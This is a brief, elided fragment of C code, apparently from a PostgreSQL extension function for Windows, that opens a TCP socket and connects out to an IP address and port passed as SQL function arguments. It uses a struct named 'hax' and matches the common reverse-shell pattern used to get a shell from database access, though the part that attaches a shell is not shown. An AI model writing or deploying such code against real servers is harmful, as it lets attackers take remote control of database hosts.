...
DatumGetCString(DirectFunctionCall1(textout, PointerGetDatum(textp)))
	...
	socketme = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL,(unsigned int)NULL);
	
	hax.sin_family = AF_INET;
	/*Import second argument as integer being the port number*/
	hax.sin_port = htons(PG_GETARG_INT32(1));
	/* Import first argument as text being the IP address*/
	hax.sin_addr.s_addr = inet_addr(GET_STR(PG_GETARG_TEXT_P(0)));
	
	WSAConnect(socketme, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
